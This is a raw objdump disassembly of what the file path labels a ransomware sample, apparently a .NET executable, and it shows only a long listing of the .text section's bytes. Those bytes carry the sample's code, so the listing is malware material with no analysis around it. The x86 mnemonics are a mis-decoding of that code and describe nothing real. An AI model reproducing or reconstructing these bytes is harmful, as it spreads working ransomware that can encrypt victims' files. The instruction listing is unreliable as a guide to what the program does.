
malware_samples/ransomware/d385e5069c4999a4d4161c038443c1682dd33dc578cd7fc9d1d5b2627e41fb5d.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 79 00             	add    %bh,0x0(%ecx)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 58 3d 00       	add    $0x3d5800,%eax
  402013:	00 6c 3b 00          	add    %ch,0x0(%ebx,%edi,1)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 02                	add    %al,(%edx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1a 28                	sbb    (%eax),%ch
  402052:	03 00                	add    (%eax),%eax
  402054:	00 06                	add    %al,(%esi)
  402056:	2a 1a                	sub    (%edx),%bl
  402058:	28 03                	sub    %al,(%ebx)
  40205a:	00 00                	add    %al,(%eax)
  40205c:	06                   	push   %es
  40205d:	2a 00                	sub    (%eax),%al
  40205f:	00 03                	add    %al,(%ebx)
  402061:	30 02                	xor    %al,(%edx)
  402063:	00 fc                	add    %bh,%ah
  402065:	00 00                	add    %al,(%eax)
  402067:	00 00                	add    %al,(%eax)
  402069:	00 00                	add    %al,(%eax)
  40206b:	00 28                	add    %ch,(%eax)
  40206d:	17                   	pop    %ss
  40206e:	00 00                	add    %al,(%eax)
  402070:	06                   	push   %es
  402071:	2c 28                	sub    $0x28,%al
  402073:	7e 1f                	jle    0x402094
  402075:	00 00                	add    %al,(%eax)
  402077:	04 2d                	add    $0x2d,%al
  402079:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  40207c:	06                   	push   %es
  40207d:	21 00                	and    %eax,(%eax)
  40207f:	00 06                	add    %al,(%esi)
  402081:	73 06                	jae    0x402089
  402083:	00 00                	add    %al,(%eax)
  402085:	0a 80 1f 00 00 04    	or     0x400001f(%eax),%al
  40208b:	7e 1f                	jle    0x4020ac
  40208d:	00 00                	add    %al,(%eax)
  40208f:	04 73                	add    $0x73,%al
  402091:	07                   	pop    %es
  402092:	00 00                	add    %al,(%eax)
  402094:	0a 28                	or     (%eax),%ch
  402096:	08 00                	or     %al,(%eax)
  402098:	00 0a                	add    %cl,(%edx)
  40209a:	2a 28                	sub    (%eax),%ch
  40209c:	05 00 00 06 2c       	add    $0x2c060000,%eax
  4020a1:	06                   	push   %es
  4020a2:	17                   	pop    %ss
  4020a3:	28 09                	sub    %cl,(%ecx)
  4020a5:	00 00                	add    %al,(%eax)
  4020a7:	0a 7e 0d             	or     0xd(%esi),%bh
  4020aa:	00 00                	add    %al,(%eax)
  4020ac:	04 2c                	add    $0x2c,%al
  4020ae:	05 28 04 00 00       	add    $0x428,%eax
  4020b3:	06                   	push   %es
  4020b4:	7e 12                	jle    0x4020c8
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	04 2c                	add    $0x2c,%al
  4020ba:	0c 7e                	or     $0x7e,%al
  4020bc:	0a 00                	or     (%eax),%al
  4020be:	00 04 28             	add    %al,(%eax,%ebp,1)
  4020c1:	14 00                	adc    $0x0,%al
  4020c3:	00 06                	add    %al,(%esi)
  4020c5:	2b 11                	sub    (%ecx),%edx
  4020c7:	7e 09                	jle    0x4020d2
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	04 2c                	add    $0x2c,%al
  4020cd:	0a 7e 0a             	or     0xa(%esi),%bh
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	04 28                	add    $0x28,%al
  4020d4:	13 00                	adc    (%eax),%eax
  4020d6:	00 06                	add    %al,(%esi)
  4020d8:	7e 0c                	jle    0x4020e6
  4020da:	00 00                	add    %al,(%eax)
  4020dc:	04 2c                	add    $0x2c,%al
  4020de:	05 28 18 00 00       	add    $0x1828,%eax
  4020e3:	06                   	push   %es
  4020e4:	7e 12                	jle    0x4020f8
  4020e6:	00 00                	add    %al,(%eax)
  4020e8:	04 2c                	add    $0x2c,%al
  4020ea:	30 7e 13             	xor    %bh,0x13(%esi)
  4020ed:	00 00                	add    %al,(%eax)
  4020ef:	04 2c                	add    $0x2c,%al
  4020f1:	05 28 1b 00 00       	add    $0x1b28,%eax
  4020f6:	06                   	push   %es
  4020f7:	7e 14                	jle    0x40210d
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	04 2c                	add    $0x2c,%al
  4020fd:	05 28 1c 00 00       	add    $0x1c28,%eax
  402102:	06                   	push   %es
  402103:	7e 15                	jle    0x40211a
  402105:	00 00                	add    %al,(%eax)
  402107:	04 2c                	add    $0x2c,%al
  402109:	05 28 1d 00 00       	add    $0x1d28,%eax
  40210e:	06                   	push   %es
  40210f:	7e 16                	jle    0x402127
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2c                	add    $0x2c,%al
  402115:	05 28 1e 00 00       	add    $0x1e28,%eax
  40211a:	06                   	push   %es
  40211b:	28 12                	sub    %dl,(%edx)
  40211d:	00 00                	add    %al,(%eax)
  40211f:	06                   	push   %es
  402120:	7e 07                	jle    0x402129
  402122:	00 00                	add    %al,(%eax)
  402124:	04 2c                	add    $0x2c,%al
  402126:	0a 7e 08             	or     0x8(%esi),%bh
  402129:	00 00                	add    %al,(%eax)
  40212b:	04 28                	add    $0x28,%al
  40212d:	19 00                	sbb    %eax,(%eax)
  40212f:	00 06                	add    %al,(%esi)
  402131:	28 16                	sub    %dl,(%esi)
  402133:	00 00                	add    %al,(%eax)
  402135:	06                   	push   %es
  402136:	7e 0f                	jle    0x402147
  402138:	00 00                	add    %al,(%eax)
  40213a:	04 28                	add    $0x28,%al
  40213c:	1f                   	pop    %ds
  40213d:	00 00                	add    %al,(%eax)
  40213f:	06                   	push   %es
  402140:	7e 20                	jle    0x402162
  402142:	00 00                	add    %al,(%eax)
  402144:	04 2d                	add    $0x2d,%al
  402146:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  402149:	06                   	push   %es
  40214a:	22 00                	and    (%eax),%al
  40214c:	00 06                	add    %al,(%esi)
  40214e:	73 06                	jae    0x402156
  402150:	00 00                	add    %al,(%eax)
  402152:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  402158:	7e 20                	jle    0x40217a
  40215a:	00 00                	add    %al,(%eax)
  40215c:	04 73                	add    $0x73,%al
  40215e:	07                   	pop    %es
  40215f:	00 00                	add    %al,(%eax)
  402161:	0a 28                	or     (%eax),%ch
  402163:	08 00                	or     %al,(%eax)
  402165:	00 0a                	add    %cl,(%edx)
  402167:	2a 2e                	sub    (%esi),%ch
  402169:	73 28                	jae    0x402193
  40216b:	00 00                	add    %al,(%eax)
  40216d:	06                   	push   %es
  40216e:	28 0a                	sub    %cl,(%edx)
  402170:	00 00                	add    %al,(%eax)
  402172:	0a 2a                	or     (%edx),%ch
  402174:	13 30                	adc    (%eax),%esi
  402176:	02 00                	add    (%eax),%al
  402178:	32 00                	xor    (%eax),%al
  40217a:	00 00                	add    %al,(%eax)
  40217c:	01 00                	add    %eax,(%eax)
  40217e:	00 11                	add    %dl,(%ecx)
  402180:	28 0b                	sub    %cl,(%ebx)
  402182:	00 00                	add    %al,(%eax)
  402184:	0a 6f 0c             	or     0xc(%edi),%ch
  402187:	00 00                	add    %al,(%eax)
  402189:	0a 28                	or     (%eax),%ch
  40218b:	0d 00 00 0a 0a       	or     $0xa0a0000,%eax
  402190:	1f                   	pop    %ds
  402191:	1a 28                	sbb    (%eax),%ch
  402193:	0e                   	push   %cs
  402194:	00 00                	add    %al,(%eax)
  402196:	0a 0b                	or     (%ebx),%cl
  402198:	06                   	push   %es
  402199:	07                   	pop    %es
  40219a:	28 0f                	sub    %cl,(%edi)
  40219c:	00 00                	add    %al,(%eax)
  40219e:	0a 2c 10             	or     (%eax,%edx,1),%ch
  4021a1:	7e 0e                	jle    0x4021b1
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	04 20                	add    $0x20,%al
  4021a7:	e8 03 00 00 5a       	call   0x5a4021af
  4021ac:	28 10                	sub    %dl,(%eax)
  4021ae:	00 00                	add    %al,(%eax)
  4021b0:	0a 2a                	or     (%edx),%ch
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	1b 30                	sbb    (%eax),%esi
  4021b6:	02 00                	add    (%eax),%al
  4021b8:	65 00 00             	add    %al,%gs:(%eax)
  4021bb:	00 02                	add    %al,(%edx)
  4021bd:	00 00                	add    %al,(%eax)
  4021bf:	11 28                	adc    %ebp,(%eax)
  4021c1:	11 00                	adc    %eax,(%eax)
  4021c3:	00 0a                	add    %cl,(%edx)
  4021c5:	0a 28                	or     (%eax),%ch
  4021c7:	12 00                	adc    (%eax),%al
  4021c9:	00 0a                	add    %cl,(%edx)
  4021cb:	0b 06                	or     (%esi),%eax
  4021cd:	13 04 16             	adc    (%esi,%edx,1),%eax
  4021d0:	13 05 2b 45 11 04    	adc    0x411452b,%eax
  4021d6:	11 05 9a 0c 08 6f    	adc    %eax,0x6f080c9a
  4021dc:	13 00                	adc    (%eax),%eax
  4021de:	00 0a                	add    %cl,(%edx)
  4021e0:	16                   	push   %ss
  4021e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e2:	14 00                	adc    $0x0,%al
  4021e4:	00 0a                	add    %cl,(%edx)
  4021e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e7:	15 00 00 0a 28       	adc    $0x280a0000,%eax
  4021ec:	16                   	push   %ss
  4021ed:	00 00                	add    %al,(%eax)
  4021ef:	0a 6f 0c             	or     0xc(%edi),%ch
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	0a 28                	or     (%eax),%ch
  4021f6:	17                   	pop    %ss
  4021f7:	00 00                	add    %al,(%eax)
  4021f9:	0a 2c 12             	or     (%edx,%edx,1),%ch
  4021fc:	07                   	pop    %es
  4021fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021fe:	18 00                	sbb    %al,(%eax)
  402200:	00 0a                	add    %cl,(%edx)
  402202:	08 6f 18             	or     %ch,0x18(%edi)
  402205:	00 00                	add    %al,(%eax)
  402207:	0a 2e                	or     (%esi),%ch
  402209:	04 17                	add    $0x17,%al
  40220b:	0d de 15 de 03       	or     $0x3de15de,%eax
  402210:	26 de 00             	fiadds %es:(%eax)
  402213:	11 05 17 58 13 05    	adc    %eax,0x5135817
  402219:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  40221f:	32 b3 16 2a 09 2a    	xor    0x2a092a16(%ebx),%dh
  402225:	00 00                	add    %al,(%eax)
  402227:	00 01                	add    %al,(%ecx)
  402229:	10 00                	adc    %al,(%eax)
  40222b:	00 00                	add    %al,(%eax)
  40222d:	00 1a                	add    %bl,(%edx)
  40222f:	00 36                	add    %dh,(%esi)
  402231:	50                   	push   %eax
  402232:	00 03                	add    %al,(%ebx)
  402234:	19 00                	sbb    %eax,(%eax)
  402236:	00 01                	add    %al,(%ecx)
  402238:	13 30                	adc    (%eax),%esi
  40223a:	04 00                	add    $0x0,%al
  40223c:	41                   	inc    %ecx
  40223d:	00 00                	add    %al,(%eax)
  40223f:	00 03                	add    %al,(%ebx)
  402241:	00 00                	add    %al,(%eax)
  402243:	11 73 19             	adc    %esi,0x19(%ebx)
  402246:	00 00                	add    %al,(%eax)
  402248:	0a 0a                	or     (%edx),%cl
  40224a:	16                   	push   %ss
  40224b:	0b 2b                	or     (%ebx),%ebp
  40224d:	2c 72                	sub    $0x72,%al
  40224f:	01 00                	add    %eax,(%eax)
  402251:	00 70 7e             	add    %dh,0x7e(%eax)
  402254:	1e                   	push   %ds
  402255:	00 00                	add    %al,(%eax)
  402257:	04 16                	add    $0x16,%al
  402259:	72 01                	jb     0x40225c
  40225b:	00 00                	add    %al,(%eax)
  40225d:	70 6f                	jo     0x4022ce
  40225f:	1a 00                	sbb    (%eax),%al
  402261:	00 0a                	add    %cl,(%edx)
  402263:	6f                   	outsl  %ds:(%esi),(%dx)
  402264:	1b 00                	sbb    (%eax),%eax
  402266:	00 0a                	add    %cl,(%edx)
  402268:	6f                   	outsl  %ds:(%esi),(%dx)
  402269:	1c 00                	sbb    $0x0,%al
  40226b:	00 0a                	add    %cl,(%edx)
  40226d:	0c 06                	or     $0x6,%al
  40226f:	08 6f 1d             	or     %ch,0x1d(%edi)
  402272:	00 00                	add    %al,(%eax)
  402274:	0a 26                	or     (%esi),%ah
  402276:	07                   	pop    %es
  402277:	17                   	pop    %ss
  402278:	58                   	pop    %eax
  402279:	0b 07                	or     (%edi),%eax
  40227b:	02 32                	add    (%edx),%dh
  40227d:	d0 06                	rolb   $1,(%esi)
  40227f:	6f                   	outsl  %ds:(%esi),(%dx)
  402280:	1e                   	push   %ds
  402281:	00 00                	add    %al,(%eax)
  402283:	0a 2a                	or     (%edx),%ch
  402285:	00 00                	add    %al,(%eax)
  402287:	00 13                	add    %dl,(%ebx)
  402289:	30 04 00             	xor    %al,(%eax,%eax,1)
  40228c:	58                   	pop    %eax
  40228d:	00 00                	add    %al,(%eax)
  40228f:	00 03                	add    %al,(%ebx)
  402291:	00 00                	add    %al,(%eax)
  402293:	11 7e 06             	adc    %edi,0x6(%esi)
  402296:	00 00                	add    %al,(%eax)
  402298:	04 72                	add    $0x72,%al
  40229a:	4b                   	dec    %ebx
  40229b:	00 00                	add    %al,(%eax)
  40229d:	70 28                	jo     0x4022c7
  40229f:	17                   	pop    %ss
  4022a0:	00 00                	add    %al,(%eax)
  4022a2:	0a 2c 41             	or     (%ecx,%eax,2),%ch
  4022a5:	73 19                	jae    0x4022c0
  4022a7:	00 00                	add    %al,(%eax)
  4022a9:	0a 0a                	or     (%edx),%cl
  4022ab:	16                   	push   %ss
  4022ac:	0b 2b                	or     (%ebx),%ebp
  4022ae:	2c 72                	sub    $0x72,%al
  4022b0:	01 00                	add    %eax,(%eax)
  4022b2:	00 70 7e             	add    %dh,0x7e(%eax)
  4022b5:	1e                   	push   %ds
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	04 16                	add    $0x16,%al
  4022ba:	72 01                	jb     0x4022bd
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	70 6f                	jo     0x40232f
  4022c0:	1a 00                	sbb    (%eax),%al
  4022c2:	00 0a                	add    %cl,(%edx)
  4022c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4022c5:	1b 00                	sbb    (%eax),%eax
  4022c7:	00 0a                	add    %cl,(%edx)
  4022c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ca:	1c 00                	sbb    $0x0,%al
  4022cc:	00 0a                	add    %cl,(%edx)
  4022ce:	0c 06                	or     $0x6,%al
  4022d0:	08 6f 1d             	or     %ch,0x1d(%edi)
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	0a 26                	or     (%esi),%ah
  4022d7:	07                   	pop    %es
  4022d8:	17                   	pop    %ss
  4022d9:	58                   	pop    %eax
  4022da:	0b 07                	or     (%edi),%eax
  4022dc:	02 32                	add    (%edx),%dh
  4022de:	d0 06                	rolb   $1,(%esi)
  4022e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4022e1:	1e                   	push   %ds
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	0a 2a                	or     (%edx),%ch
  4022e6:	7e 06                	jle    0x4022ee
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	04 2a                	add    $0x2a,%al
  4022ec:	13 30                	adc    (%eax),%esi
  4022ee:	02 00                	add    (%eax),%al
  4022f0:	13 00                	adc    (%eax),%eax
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	04 00                	add    $0x0,%al
  4022f6:	00 11                	add    %dl,(%ecx)
  4022f8:	28 1f                	sub    %bl,(%edi)
  4022fa:	00 00                	add    %al,(%eax)
  4022fc:	0a 02                	or     (%edx),%al
  4022fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4022ff:	20 00                	and    %al,(%eax)
  402301:	00 0a                	add    %cl,(%edx)
  402303:	0a 06                	or     (%esi),%al
  402305:	28 21                	sub    %ah,(%ecx)
  402307:	00 00                	add    %al,(%eax)
  402309:	0a 2a                	or     (%edx),%ch
  40230b:	1e                   	push   %ds
  40230c:	02 28                	add    (%eax),%ch
  40230e:	22 00                	and    (%eax),%al
  402310:	00 0a                	add    %cl,(%edx)
  402312:	2a 4a 03             	sub    0x3(%edx),%cl
  402315:	02 7b 24             	add    0x24(%ebx),%bh
  402318:	00 00                	add    %al,(%eax)
  40231a:	04 6f                	add    $0x6f,%al
  40231c:	23 00                	and    (%eax),%eax
  40231e:	00 0a                	add    %cl,(%edx)
  402320:	28 17                	sub    %dl,(%edi)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 2a                	or     (%edx),%ch
  402326:	00 00                	add    %al,(%eax)
  402328:	1b 30                	sbb    (%eax),%esi
  40232a:	03 00                	add    (%eax),%eax
  40232c:	3c 01                	cmp    $0x1,%al
  40232e:	00 00                	add    %al,(%eax)
  402330:	05 00 00 11 02       	add    $0x2110000,%eax
  402335:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402338:	00 0a                	add    %cl,(%edx)
  40233a:	0a 17                	or     (%edi),%dl
  40233c:	0b 16                	or     (%esi),%edx
  40233e:	0c 38                	or     $0x38,%al
  402340:	f8                   	clc
  402341:	00 00                	add    %al,(%eax)
  402343:	00 73 2f             	add    %dh,0x2f(%ebx)
  402346:	00 00                	add    %al,(%eax)
  402348:	06                   	push   %es
  402349:	13 09                	adc    (%ecx),%ecx
  40234b:	11 09                	adc    %ecx,(%ecx)
  40234d:	06                   	push   %es
  40234e:	08 9a 28 25 00 00    	or     %bl,0x2528(%edx)
  402354:	0a 7d 24             	or     0x24(%ebp),%bh
  402357:	00 00                	add    %al,(%eax)
  402359:	04 06                	add    $0x6,%al
  40235b:	08 9a 28 26 00 00    	or     %bl,0x2628(%edx)
  402361:	0a 0d 7e 1d 00 00    	or     0x1d7e,%cl
  402367:	04 11                	add    $0x11,%al
  402369:	09 fe                	or     %edi,%esi
  40236b:	06                   	push   %es
  40236c:	30 00                	xor    %al,(%eax)
  40236e:	00 06                	add    %al,(%esi)
  402370:	73 27                	jae    0x402399
  402372:	00 00                	add    %al,(%eax)
  402374:	0a 28                	or     (%eax),%ch
  402376:	01 00                	add    %eax,(%eax)
  402378:	00 2b                	add    %ch,(%ebx)
  40237a:	39 b4 00 00 00 09 7e 	cmp    %esi,0x7e090000(%eax,%eax,1)
  402381:	11 00                	adc    %eax,(%eax)
  402383:	00 04 28             	add    %al,(%eax,%ebp,1)
  402386:	0f 00 00             	sldt   (%eax)
  402389:	0a 39                	or     (%ecx),%bh
  40238b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40238c:	00 00                	add    %al,(%eax)
  40238e:	00 06                	add    %al,(%esi)
  402390:	08 9a 73 29 00 00    	or     %bl,0x2973(%edx)
  402396:	0a 13                	or     (%ebx),%dl
  402398:	04 11                	add    $0x11,%al
  40239a:	04 20                	add    $0x20,%al
  40239c:	80 00 00             	addb   $0x0,(%eax)
  40239f:	00 6f 2a             	add    %ch,0x2a(%edi)
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	0a 1f                	or     (%edi),%bl
  4023a6:	28 28                	sub    %ch,(%eax)
  4023a8:	0c 00                	or     $0x0,%al
  4023aa:	00 06                	add    %al,(%esi)
  4023ac:	13 05 11 04 6f 2b    	adc    0x2b6f0411,%eax
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	0a 20                	or     (%eax),%ah
  4023b6:	00 d8                	add    %bl,%al
  4023b8:	94                   	xchg   %eax,%esp
  4023b9:	51                   	push   %ecx
  4023ba:	6a 2f                	push   $0x2f
  4023bc:	26 11 05 28 0b 00 00 	adc    %eax,%es:0xb28
  4023c3:	06                   	push   %es
  4023c4:	28 11                	sub    %dl,(%ecx)
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	06                   	push   %es
  4023c9:	13 06                	adc    (%esi),%eax
  4023cb:	06                   	push   %es
  4023cc:	08 9a 28 0a 00 00    	or     %bl,0xa28(%edx)
  4023d2:	06                   	push   %es
  4023d3:	2c 1f                	sub    $0x1f,%al
  4023d5:	06                   	push   %es
  4023d6:	08 9a 11 05 11 06    	or     %bl,0x6110511(%edx)
  4023dc:	28 0d 00 00 06 2b    	sub    %cl,0x2b060000
  4023e2:	11 06                	adc    %eax,(%esi)
  4023e4:	08 9a 11 05 11 04    	or     %bl,0x4110511(%edx)
  4023ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4023eb:	2b 00                	sub    (%eax),%eax
  4023ed:	00 0a                	add    %cl,(%edx)
  4023ef:	28 0f                	sub    %cl,(%edi)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	06                   	push   %es
  4023f4:	07                   	pop    %es
  4023f5:	2c 3c                	sub    $0x3c,%al
  4023f7:	16                   	push   %ss
  4023f8:	0b 02                	or     (%edx),%eax
  4023fa:	72 4d                	jb     0x402449
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	70 7e                	jo     0x40247e
  402400:	11 00                	adc    %eax,(%eax)
  402402:	00 04 28             	add    %al,(%eax,%ebp,1)
  402405:	2c 00                	sub    $0x0,%al
  402407:	00 0a                	add    %cl,(%edx)
  402409:	13 07                	adc    (%edi),%eax
  40240b:	1f                   	pop    %ds
  40240c:	19 28                	sbb    %ebp,(%eax)
  40240e:	0e                   	push   %cs
  40240f:	00 00                	add    %al,(%eax)
  402411:	0a 13                	or     (%ebx),%dl
  402413:	08 11                	or     %dl,(%ecx)
  402415:	07                   	pop    %es
  402416:	28 2d 00 00 0a 2d    	sub    %ch,0x2d0a0000
  40241c:	16                   	push   %ss
  40241d:	02 11                	add    (%ecx),%dl
  40241f:	08 28                	or     %ch,(%eax)
  402421:	0f 00 00             	sldt   (%eax)
  402424:	0a 2c 0c             	or     (%esp,%ecx,1),%ch
  402427:	11 07                	adc    %eax,(%edi)
  402429:	7e 1c                	jle    0x402447
  40242b:	00 00                	add    %al,(%eax)
  40242d:	04 28                	add    $0x28,%al
  40242f:	2e 00 00             	add    %al,%cs:(%eax)
  402432:	0a de                	or     %dh,%bl
  402434:	03 26                	add    (%esi),%esp
  402436:	de 00                	fiadds (%eax)
  402438:	08 17                	or     %dl,(%edi)
  40243a:	58                   	pop    %eax
  40243b:	0c 08                	or     $0x8,%al
  40243d:	06                   	push   %es
  40243e:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402441:	ff                   	(bad)
  402442:	fe                   	(bad)
  402443:	ff                   	(bad)
  402444:	ff 02                	incl   (%edx)
  402446:	28 2f                	sub    %ch,(%edi)
  402448:	00 00                	add    %al,(%eax)
  40244a:	0a 13                	or     (%ebx),%dl
  40244c:	0a 16                	or     (%esi),%dl
  40244e:	13 0b                	adc    (%ebx),%ecx
  402450:	2b 10                	sub    (%eax),%edx
  402452:	11 0a                	adc    %ecx,(%edx)
  402454:	11 0b                	adc    %ecx,(%ebx)
  402456:	9a 28 09 00 00 06 11 	lcall  $0x1106,$0x928
  40245d:	0b 17                	or     (%edi),%edx
  40245f:	58                   	pop    %eax
  402460:	13 0b                	adc    (%ebx),%ecx
  402462:	11 0b                	adc    %ecx,(%ebx)
  402464:	11 0a                	adc    %ecx,(%edx)
  402466:	8e 69 32             	mov    0x32(%ecx),%gs
  402469:	e8 de 03 26 de       	call   0xde66284c
  40246e:	00 2a                	add    %ch,(%edx)
  402470:	41                   	inc    %ecx
  402471:	34 00                	xor    $0x0,%al
  402473:	00 00                	add    %al,(%eax)
  402475:	00 00                	add    %al,(%eax)
  402477:	00 10                	add    %dl,(%eax)
  402479:	00 00                	add    %al,(%eax)
  40247b:	00 f1                	add    %dh,%cl
  40247d:	00 00                	add    %al,(%eax)
  40247f:	00 01                	add    %al,(%ecx)
  402481:	01 00                	add    %eax,(%eax)
  402483:	00 03                	add    %al,(%ebx)
  402485:	00 00                	add    %al,(%eax)
  402487:	00 19                	add    %bl,(%ecx)
  402489:	00 00                	add    %al,(%eax)
  40248b:	01 00                	add    %eax,(%eax)
  40248d:	00 00                	add    %al,(%eax)
  40248f:	00 00                	add    %al,(%eax)
  402491:	00 00                	add    %al,(%eax)
  402493:	00 38                	add    %bh,(%eax)
  402495:	01 00                	add    %eax,(%eax)
  402497:	00 38                	add    %bh,(%eax)
  402499:	01 00                	add    %eax,(%eax)
  40249b:	00 03                	add    %al,(%ebx)
  40249d:	00 00                	add    %al,(%eax)
  40249f:	00 19                	add    %bl,(%ecx)
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	01 13                	add    %edx,(%ebx)
  4024a5:	30 03                	xor    %al,(%ebx)
  4024a7:	00 4e 00             	add    %cl,0x0(%esi)
  4024aa:	00 00                	add    %al,(%eax)
  4024ac:	06                   	push   %es
  4024ad:	00 00                	add    %al,(%eax)
  4024af:	11 02                	adc    %eax,(%edx)
  4024b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b2:	23 00                	and    (%eax),%eax
  4024b4:	00 0a                	add    %cl,(%edx)
  4024b6:	10 00                	adc    %al,(%eax)
  4024b8:	18 8d 15 00 00 01    	sbb    %cl,0x1000015(%ebp)
  4024be:	0d 09 16 72 51       	or     $0x51721609,%eax
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	70 a2                	jo     0x402469
  4024c7:	09 17                	or     %edx,(%edi)
  4024c9:	72 6d                	jb     0x402538
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	70 a2                	jo     0x402471
  4024cf:	09 0a                	or     %ecx,(%edx)
  4024d1:	06                   	push   %es
  4024d2:	13 04 16             	adc    (%esi,%edx,1),%eax
  4024d5:	13 05 2b 19 11 04    	adc    0x411192b,%eax
  4024db:	11 05 9a 0b 02 07    	adc    %eax,0x7020b9a
  4024e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e2:	30 00                	xor    %al,(%eax)
  4024e4:	00 0a                	add    %cl,(%edx)
  4024e6:	2c 04                	sub    $0x4,%al
  4024e8:	16                   	push   %ss
  4024e9:	0c de                	or     $0xde,%al
  4024eb:	10 11                	adc    %dl,(%ecx)
  4024ed:	05 17 58 13 05       	add    $0x5135817,%eax
  4024f2:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  4024f8:	32 df                	xor    %bh,%bl
  4024fa:	17                   	pop    %ss
  4024fb:	2a 08                	sub    (%eax),%cl
  4024fd:	2a 00                	sub    (%eax),%al
  4024ff:	00 13                	add    %dl,(%ebx)
  402501:	30 02                	xor    %al,(%edx)
  402503:	00 49 00             	add    %cl,0x0(%ecx)
  402506:	00 00                	add    %al,(%eax)
  402508:	07                   	pop    %es
  402509:	00 00                	add    %al,(%eax)
  40250b:	11 73 19             	adc    %esi,0x19(%ebx)
  40250e:	00 00                	add    %al,(%eax)
  402510:	0a 0a                	or     (%edx),%cl
  402512:	06                   	push   %es
  402513:	72 8f                	jb     0x4024a4
  402515:	00 00                	add    %al,(%eax)
  402517:	70 6f                	jo     0x402588
  402519:	31 00                	xor    %eax,(%eax)
  40251b:	00 0a                	add    %cl,(%edx)
  40251d:	26 06                	es push %es
  40251f:	72 df                	jb     0x402500
  402521:	00 00                	add    %al,(%eax)
  402523:	70 6f                	jo     0x402594
  402525:	31 00                	xor    %eax,(%eax)
  402527:	00 0a                	add    %cl,(%edx)
  402529:	26 06                	es push %es
  40252b:	72 c6                	jb     0x4024f3
  40252d:	01 00                	add    %eax,(%eax)
  40252f:	70 6f                	jo     0x4025a0
  402531:	31 00                	xor    %eax,(%eax)
  402533:	00 0a                	add    %cl,(%edx)
  402535:	26 06                	es push %es
  402537:	72 fe                	jb     0x402537
  402539:	01 00                	add    %eax,(%eax)
  40253b:	70 6f                	jo     0x4025ac
  40253d:	31 00                	xor    %eax,(%eax)
  40253f:	00 0a                	add    %cl,(%edx)
  402541:	26 06                	es push %es
  402543:	72 db                	jb     0x402520
  402545:	04 00                	add    $0x0,%al
  402547:	70 6f                	jo     0x4025b8
  402549:	31 00                	xor    %eax,(%eax)
  40254b:	00 0a                	add    %cl,(%edx)
  40254d:	26 06                	es push %es
  40254f:	6f                   	outsl  %ds:(%esi),(%dx)
  402550:	1e                   	push   %ds
  402551:	00 00                	add    %al,(%eax)
  402553:	0a 2a                	or     (%edx),%ch
  402555:	00 00                	add    %al,(%eax)
  402557:	00 13                	add    %dl,(%ebx)
  402559:	30 04 00             	xor    %al,(%eax,%eax,1)
  40255c:	3f                   	aas
  40255d:	00 00                	add    %al,(%eax)
  40255f:	00 08                	add    %cl,(%eax)
  402561:	00 00                	add    %al,(%eax)
  402563:	11 73 19             	adc    %esi,0x19(%ebx)
  402566:	00 00                	add    %al,(%eax)
  402568:	0a 0a                	or     (%edx),%cl
  40256a:	73 32                	jae    0x40259e
  40256c:	00 00                	add    %al,(%eax)
  40256e:	0a 0b                	or     (%ebx),%cl
  402570:	2b 21                	sub    (%ecx),%esp
  402572:	06                   	push   %es
  402573:	72 fd                	jb     0x402572
  402575:	04 00                	add    $0x0,%al
  402577:	70 07                	jo     0x402580
  402579:	72 fd                	jb     0x402578
  40257b:	04 00                	add    $0x0,%al
  40257d:	70 6f                	jo     0x4025ee
  40257f:	1a 00                	sbb    (%eax),%al
  402581:	00 0a                	add    %cl,(%edx)
  402583:	6f                   	outsl  %ds:(%esi),(%dx)
  402584:	33 00                	xor    (%eax),%eax
  402586:	00 0a                	add    %cl,(%edx)
  402588:	6f                   	outsl  %ds:(%esi),(%dx)
  402589:	1c 00                	sbb    $0x0,%al
  40258b:	00 0a                	add    %cl,(%edx)
  40258d:	6f                   	outsl  %ds:(%esi),(%dx)
  40258e:	1d 00 00 0a 26       	sbb    $0x260a0000,%eax
  402593:	16                   	push   %ss
  402594:	02 25 17 59 10 00    	add    0x105917,%ah
